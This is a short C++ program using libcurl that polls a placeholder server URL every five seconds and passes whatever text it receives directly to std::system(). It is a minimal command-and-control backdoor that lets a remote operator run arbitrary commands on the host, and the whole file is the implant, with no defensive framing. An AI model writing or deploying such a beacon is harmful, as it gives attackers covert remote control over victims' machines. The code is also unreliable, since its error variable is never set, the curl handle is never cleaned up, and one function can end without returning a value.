#include <iostream>
#include <curl/curl.h>
#include <string>
#include <chrono>
#include <thread>
//curl_handler
size_t writeFuncCall(char *a, size_t b, size_t c, std::string *d){
  d->append(a, b*c);
  return b*c;
}

//curl
std::string send_req(const std::string& url){
  CURL *curl;
  CURLcode rescode;
  std::string response;
  curl=curl_easy_init();
  std::string returner;
  if (curl){
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFuncCall);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_perform(curl);
    if (rescode != CURLE_OK){
      std::string converted("Error");
      return converted;
   }
    else {
      std::string converted(response);
    return converted;
}
 }
}

//main
int main(){
  std::string getcmd="https://<server_domain>/torun";
  std::string errmsg = "Error";
  int x=1;
  while (x==1){
    std::string torun;
    torun=send_req(getcmd);
    if (!torun.empty()){
      std::system(torun.c_str());
  }
   std::this_thread::sleep_for(std::chrono::seconds(5));
 }
  return 0;
}
